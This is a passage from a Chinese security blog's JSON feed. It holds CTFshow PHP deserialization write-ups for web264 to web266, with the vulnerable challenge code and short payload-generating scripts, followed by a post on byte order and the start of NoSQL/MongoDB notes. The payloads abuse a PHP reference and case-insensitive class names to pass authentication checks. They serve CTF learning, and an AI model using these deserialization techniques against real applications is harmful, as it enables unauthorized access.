constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>看了半天才反应过来，这里少了一个 setcookie ('msg',base64_encode ($umsg));，做法稍微有一点改动</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305110134330.png\" alt=\"image-20230305110134330\" /></p>\n<p>首先在首页将 payload 传入，payload 为什么是这样的详看 262，这里访问后会有一个 session，带着这个 session 访问 message 即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305110259089.png\" alt=\"image-20230305110259089\" /></p>\n<p>还得加上 msg</p>\n<h2 id=\"web265\"><a class=\"anchor\" href=\"#web265\">#</a> web265</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowAdmin</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">=</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">===</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$ctfshow</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">=</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>在本题中，token 的值在最后会改变，这里修改 passwd 的值为 token 的引用即可</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowAdmin</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfshowAdmin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305122631830.png\" alt=\"image-20230305122631830\" /></p>\n<h2 id=\"web266\"><a class=\"anchor\" href=\"#web266\">#</a> web266</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$cs</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshow</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token variable\">$ctfshowo</span><span class=\"token operator\">=</span>@<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ctfshow/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$cs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Error <span class=\"token interpolation\"><span class=\"token variable\">$ctfshowo</span></span>\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这个题换了一种传参的方式，file_get_contents ('php://input');，通过使用伪协议读取 post 数据，然后又利用了一个大小写不敏感</p>\n<p>pyaload：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshow</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305134607238.png\" alt=\"image-20230305134607238\" /></p>\n<p>后面的跟前面的区别稍微有点大，另起一篇做一个简单的总结</p>\n",
            "tags": [
                "CTFshow",
                "php反序列化"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/05/%E5%B0%8F%E7%AB%AF%E5%BA%8F%E6%A0%87%E8%AE%B0%E6%B3%95/",
            "url": "https://blog.xcu.icu/2023/03/05/%E5%B0%8F%E7%AB%AF%E5%BA%8F%E6%A0%87%E8%AE%B0%E6%B3%95/",
            "title": "小端序标记法",
            "date_published": "2023-03-05T04:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>本篇浅了解一下大端序和小端序</p>\n<h2 id=\"字节序\"><a class=\"anchor\" href=\"#字节序\">#</a> 字节序</h2>\n<p>字节序是多字节数据在计算机内存中存储或网络传输时各个数据的存储顺序，主要分为两类，大端序和小端序</p>\n<p>例：</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BYTE b <span class=\"token operator\">=</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>WORD w <span class=\"token operator\">=</span> <span class=\"token number\">0x1234</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>DWORD dw <span class=\"token operator\">=</span> <span class=\"token number\">0x12345678</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>char str<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"abcde\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上面的例子中一共有四种数据类型，他们大小不同，下表中是同一个数据在不同的字节序保存时的不同</p>\n<table>\n<thead>\n<tr>\n<th>TYPE</th>\n<th>Name</th>\n<th>SIZE</th>\n<th>大端序类型</th>\n<th>小端序类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>BYTE</td>\n<td>b</td>\n<td>1</td>\n<td>[12]</td>\n<td>[12]</td>\n</tr>\n<tr>\n<td>WORD</td>\n<td>w</td>\n<td>2</td>\n<td>[12][34]</td>\n<td>[34][12]</td>\n</tr>\n<tr>\n<td>DWORD</td>\n<td>dw</td>\n<td>4</td>\n<td>[12][34][56][78]</td>\n<td>[78][56][34][12]</td>\n</tr>\n<tr>\n<td>char[]</td>\n<td>str</td>\n<td>6</td>\n<td>[61][62][63][64][65][00]</td>\n<td>[61][62][63][64][65][00]</td>\n</tr>\n</tbody>\n</table>\n<p><code>查看ASCLL表，a的ASCLL码的16进制为0x61，这里注意字符串最后是以null结尾</code></p>\n<p>当数据类型为 BYTE 的时候，因为长度为 1 个字节，两种字序的字节顺序是一样的，当数据长度为 2 个字节以上的时，大端序采用内存地址地位存数据高位，地址高位存储数据低位，采用一种直观的字节存储循序，而小端序则刚好相反</p>\n<p>这里第四种情况种，字符串 abcde 被存放在一个字符数组中，因为字符数组在内存中是连续的，故存取顺序与字节序无关</p>\n<h3 id=\"在od中查看小端序\"><a class=\"anchor\" href=\"#在od中查看小端序\">#</a> 在 OD 中查看小端序</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"windows.h\"</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>BYTE b <span class=\"token operator\">=</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>WORD w <span class=\"token operator\">=</span> <span class=\"token number\">0x1234</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>DWORD dw <span class=\"token operator\">=</span> <span class=\"token number\">0x12345678</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">char</span> str<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"abcde\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tbyte lb <span class=\"token operator\">=</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tWORD lw <span class=\"token operator\">=</span> w<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tDWORD ldw <span class=\"token operator\">=</span> dw<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>lstr <span class=\"token operator\">=</span> str<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305021739013.png\" alt=\"image-20230305021739013\" /></p>\n",
            "tags": [
                "REVERSE",
                "小端序标记法"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/01/nosql/",
            "url": "https://blog.xcu.icu/2023/03/01/nosql/",
            "title": "nosql学习笔记",
            "date_published": "2023-03-01T04:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>一直听说 nosql 好，刚好 ctfshow 中有 nosql 注入的练习，简单记录一下学习的过程</p>\n<p>参考文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9tb25nb2RiL21vbmdvZGItdHV0b3JpYWwuaHRtbA==\">MongoDB 教程 | 菜鸟教程 (runoob.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTkwOCN0b2MtNw==\">Nosql 注入从零到一 - 先知社区 (aliyun.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjAyMDky\">从零学习 NoSQL 注入之 Mongodb - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<h2 id=\"一点概念\"><a class=\"anchor\" href=\"#一点概念\">#</a> 一点概念</h2>\n<h3 id=\"nosql\"><a class=\"anchor\" href=\"#nosql\">#</a> nosql</h3>\n<p>基础的概念还是比较重要的，接下来看看维基对 nosql 的描述</p>\n<p><strong>NoSQL</strong>（最初表示<strong> No</strong>n-<strong>SQL</strong>，后来有人转解为<strong> N</strong>ot <strong>o</strong>nly <strong>SQL</strong>，是对不同于传统的 [关系数据库] 庫) 的 [数据库管理系统] 数据库管理系统) 的统称。</p>\n<p>和传统的数据库有较大的区别</p>\n<ol>\n<li>数据组织方式：传统数据库采用表格的方式组织数据，而 NoSQL 数据库则使用键值对、文档型、列型等不同的方式来组织数据。</li>\n<li>数据模型：传统数据库使用严格的数据模型，例如关系模型，要求数据必须按照事先定义好的模式进行存储。而 NoSQL 数据库则通常具有更为灵活的数据模型，能够根据需要动态调整数据结构，更适用于数据结构频繁变化的应用场景。</li>\n<li>可扩展性：传统数据库通常只能通过硬件升级或者数据分片的方式来扩展性能和存储容量，而 NoSQL 数据库通常具有良好的可扩展性，可以通过横向扩展（增加节点）来扩展存储容量和性能。</li>\n<li>高并发：NoSQL 数据库通常具有较高的读写性能，能够满足高并发的需求。</li>\n<li>适用场景：传统数据库适用于结构化数据的存储和管理，而 NoSQL 数据库则更适用于非结构化数据的存储和管理，例如文档、图像、视频等。</li>\n</ol>\n<p>下文来自 OWSPF 的总结：</p>\n<p>NoSQL 数据库提供的一致性限制比传统 SQL 数据库更宽松。通过减少关系约束和一致性检查，NoSQL 数据库通常提供性能和扩展优势。然而，这些数据库仍然可能容易受到注入攻击，即使它们没有使用传统的 SQL 语法。由于这些 NoSQL 注入攻击可能在过程语言中执行，而不是在声明性 SQL 语言中执行，因此其潜在影响大于传统的 SQL 注入。</p>\n<h3 id=\"mongodb\"><a class=\"anchor\" href=\"#mongodb\">#</a> mongodb</h3>\n<p>以下摘自菜鸟</p>\n<p>MongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。</p>\n<p>MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。</p>\n<p>下表将帮助您更容易理解 Mongo 中的一些概念：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">SQL 术语 / 概念</th>\n<th style=\"text-align:left\">MongoDB 术语 / 概念</th>\n<th style=\"text-align:left\">解释 / 说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">database</td>\n<td style=\"text-align:left\">database</td>\n<td style=\"text-align:left\">数据库</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">table</td>\n<td style=\"text-align:left\">collection</td>\n<td style=\"text-align:left\">数据库表 / 集合</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">row</td>\n<td style=\"text-align:left\">document</td>\n<td style=\"text-align:left\">数据记录行 / 文档</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">column</td>\n<td style=\"text-align:left\">field</td>\n<td style=\"text-align:left\">数据字段 / 域</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">index</td>\n<td style=\"text-align:left\">index</td>\n<td style=\"text-align:left\">索引</td>\n</tr>\n<tr>\n<td 